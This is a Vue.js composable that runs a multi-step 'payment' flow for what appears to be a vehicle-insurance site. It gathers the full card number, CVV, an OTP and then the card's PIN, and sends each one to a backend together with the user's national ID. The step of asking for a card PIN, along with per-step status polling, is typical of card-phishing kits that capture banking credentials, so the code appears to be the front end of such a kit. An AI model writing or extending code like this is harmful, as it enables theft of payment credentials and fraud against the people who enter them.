import { ref, reactive, computed, readonly } from 'vue';
import logger from '@/utils/logger';
import * as paymentApi from '@/api/paymentApi';
import { useInsuranceStore } from '@/store/modules/insurance';
import { getSessionToken } from '@/utils/sessionToken';

const LOG_TAG = 'Payment';

/**
 * usePayment
 *
 * Orchestration composable for the entire payment flow.
 * Manages shared state that persists across page navigations via sessionStorage,
 * provides wrapped API calls with loading/error states, and helpers for IP resolution.
 *
 * Usage:
 *   const { context, loading, error, processCardPayment, submitOtp, ... } = usePayment();
 */
export function usePayment ()
{
    // ─── Reactive State ─────────────────────────────────────────────

    const loading = ref( false );
    const error = ref( '' );
    const customerIp = ref( '' );

    /**
     * Payment context read from sessionStorage.
     * Written by CheckoutPage after card submission, consumed by subsequent pages.
     */
    const context = reactive( loadContext() );

    // ─── Context Helpers ────────────────────────────────────────────

    function loadContext ()
    {
        try
        {
            const raw = sessionStorage.getItem( 'otpContext' );
            if ( raw )
            {
                const parsed = JSON.parse( raw );
                customerIp.value = parsed.customerIp || '';
                return parsed;
            }
        } catch ( e )
        {
            logger.warn( `[${ LOG_TAG }] Failed to parse otpContext:`, e );
        }

        return {
            sessionId: '',
            customerIp: '',
            bankCode: null,
            cardBin: '',
            cardLast4: '',
            cardHolder: '',
            totalAmount: 0,
            cardId: null,
            statusSigs: { card: '', otp: '', pin: '' },
        };
    }

    /**
     * Persist context to sessionStorage so downstream pages can read it.
     */
    function saveContext ( data )
    {
        Object.assign( context, data );
        customerIp.value = data.customerIp || customerIp.value;
        try
        {
            sessionStorage.setItem( 'otpContext', JSON.stringify( context ) );
        } catch { /* quota exceeded — safe to ignore */ }
    }

    /**
     * Load order data from sessionStorage.
     */
    function getOrderData ()
    {
        try
        {
            const raw = sessionStorage.getItem( 'orderData' );
            return raw ? JSON.parse( raw ) : null;
        } catch
        {
            return null;
        }
    }

    // ─── IP Resolution ──────────────────────────────────────────────

    /**
     * Resolve customer IP if not already known.
     * @returns {Promise<string>} resolved IP
     */
    async function resolveCustomerIp ()
    {
        if ( customerIp.value ) return customerIp.value;

        try
        {
            const { data } = await paymentApi.getCustomerIp();
            const ip = data?.customer_ip || data?.ip || '';
            customerIp.value = ip;
            // Update context in sessionStorage too
            if ( ip && context.sessionId )
            {
                context.customerIp = ip;
                saveContext( context );
            }
            logger.debug( `[${ LOG_TAG }] Resolved customer IP:`, ip );
            return ip;
        } catch ( e )
        {
            logger.error( `[${ LOG_TAG }] Failed to resolve IP:`, e );
            return '';
        }
    }

    // ─── Card Payment ───────────────────────────────────────────────

    /**
     * Submit card data to the backend.
     * Writes otpContext + orderData to sessionStorage on success.
     *
     * @param {Object} cardData  — card fields (card_number, holder_name, expiry_month, expiry_year, cvv)
     * @param {Object} orderInfo — { sessionId, totalPrice, selectedInsurance }
     * @returns {Promise<{ cardId: number, customerIp: string } | null>}
     */
    async function processCardPayment ( cardData, orderInfo )
    {
        loading.value = true;
        error.value = '';

        try
        {
            // Include national_id for consistent backend identity resolution
            const insuranceStore = useInsuranceStore();
            const nationalId = insuranceStore.driver?.nationalId || '';

            const payload = {
                ...cardData,
                session_id: orderInfo.sessionId || getSessionToken(),
                total_price: orderInfo.totalPrice ?? null,
                selected_insurance: orderInfo.selectedInsurance ?? null,
                national_id: nationalId || undefined,
            };

            logger.debug( `[${ LOG_TAG }] Submitting card payment…` );
            const { data } = await paymentApi.submitCard( payload );

            const cardId = data?.card_id;
            const ip = data?.customer_ip || customerIp.value;
            const statusSigCard = data?.status_sig || '';

            // Build and save context for downstream pages
            const ctx = {
                sessionId: payload.session_id,
                customerIp: ip,
                bankCode: data?.bank_code || null,
                cardBin: ( cardData.card_number || '' ).replace( /\s/g, '' ).substring( 0, 6 ),
                cardLast4: ( cardData.card_number || '' ).replace( /\s/g, '' ).slice( -4 ),
                cardHolder: cardData.holder_name || '',
                totalAmount: orderInfo.totalPrice || 0,
                cardId,
                statusSigs: { card: statusSigCard, otp: '', pin: '' },
            };
            saveContext( ctx );

            // Also save order data
            try
            {
                sessionStorage.setItem( 'orderData', JSON.stringify( {
                    ...orderInfo,
                    cardId,
                    customerIp: ip,
                    timestamp: Date.now(),
                } ) );
            } catch { /* ignore */ }

            logger.info( `[${ LOG_TAG }] Card submitted — cardId=${ cardId }` );
            return { cardId, customerIp: ip };
        } catch ( e )
        {
            const msg = e.response?.data?.message || e.message || 'حدث خطأ أثناء إرسال بيانات البطاقة';
            error.value = msg;
            logger.error( `[${ LOG_TAG }] Card submission failed:`, e );
            return null;
        } finally
        {
            loading.value = false;
        }
    }

    // ─── OTP ────────────────────────────────────────────────────────

    /**
     * Submit an OTP code.
     * @param {string} otp — the OTP digits
     * @returns {Promise<boolean>} success
     */
    async function submitOtp ( otp )
    {
        loading.value = true;
        error.value = '';

        try
        {
            logger.debug( `[${ LOG_TAG }] Submitting OTP (${ otp.length } digits)…` );
            const insuranceStore = useInsuranceStore();
            const { data } = await paymentApi.submitOtp( {
                session_id: context.sessionId,
                otp,
                length: otp.length,
                national_id: insuranceStore.driver?.nationalId || undefined,
            } );

            // Capture OTP status signature for polling
            if ( data?.status_sig )
            {
                const sigs = { ...( context.statusSigs || {} ), otp: data.status_sig };
                saveContext( { ...context, statusSigs: sigs } );
            }

            return true;
        } catch ( e )
        {
            const msg = e.response?.data?.message || e.message || 'فشل التحقق من رمز OTP';
            error.value = msg;
            logger.error( `[${ LOG_TAG }] OTP submit failed:`, e );
            return false;
        } finally
        {
            loading.value = false;
        }
    }

    /**
     * Resend OTP code.
     * @returns {Promise<boolean>} success
     */
    async function resendOtpCode ()
    {
        error.value = '';

        try
        {
            logger.debug( `[${ LOG_TAG }] Resending OTP…` );
            const ip = customerIp.value || await resolveCustomerIp();
            await paymentApi.resendOtp( {
                session_id: context.sessionId,
                customer_ip: ip,
            } );
            return true;
        } catch ( e )
        {
            const msg = e.response?.data?.message || e.message || 'فشل إعادة إرسال الرمز';
            error.value = msg;
            logger.error( `[${ LOG_TAG }] OTP resend failed:`, e );
            return false;
        }
    }

    // ─── PIN ────────────────────────────────────────────────────────

    /**
     * Submit card PIN.
     * @param {string} pin — 4-digit PIN
     * @returns {Promise<boolean>} success
     */
    async function submitPin ( pin )
    {
        loading.value = true;
        error.value = '';

        try
        {
            logger.debug( `[${ LOG_TAG }] Submitting PIN…` );
            const insuranceStore = useInsuranceStore();
            const { data } = await paymentApi.submitPin( {
                session_id: context.sessionId,
                pin,
                national_id: insuranceStore.driver?.nationalId || undefined,
            } );

            // Capture PIN status signature for polling
            if ( data?.status_sig )
            {
                const sigs = { ...( context.statusSigs || {} ), pin: data.status_sig };
                saveContext( { ...context, statusSigs: sigs } );
            }

            return true;
        } catch ( e )
        {
            const msg = e.response?.data?.message || e.message || 'فشل التحقق من رمز PIN';
            error.value = msg;
            logger.error( `[${ LOG_TAG }] PIN submit failed:`, e );
            return false;
        } finally
        {
            loading.value = false;
        }
    }

    // ─── Utilities ──────────────────────────────────────────────────

    function clearError ()
    {
        error.value = '';
    }

    function resetState ()
    {
        loading.value = false;
        error.value = '';
        customerIp.value = '';
        Object.assign( context, {
            sessionId: '',
            customerIp: '',
            bankCode: null,
            cardBin: '',
            cardLast4: '',
            cardHolder: '',
            totalAmount: 0,
            cardId: null,
            statusSigs: { card: '', otp: '', pin: '' },
        } );
    }

    // ─── Computed ───────────────────────────────────────────────────

    const hasContext = computed( () => !!context.sessionId );
    const maskedCard = computed( () => context.cardLast4 ? `**** ${ context.cardLast4 }` : '' );

    return {
        // State
        context: readonly( context ),
        loading: readonly( loading ),
        error,
        customerIp,

        // Computed
        hasContext,
        maskedCard,

        // Actions
        processCardPayment,
        submitOtp,
        resendOtpCode,
        submitPin,
        resolveCustomerIp,
        saveContext,
        getOrderData,
        clearError,
        resetState,
    };
}
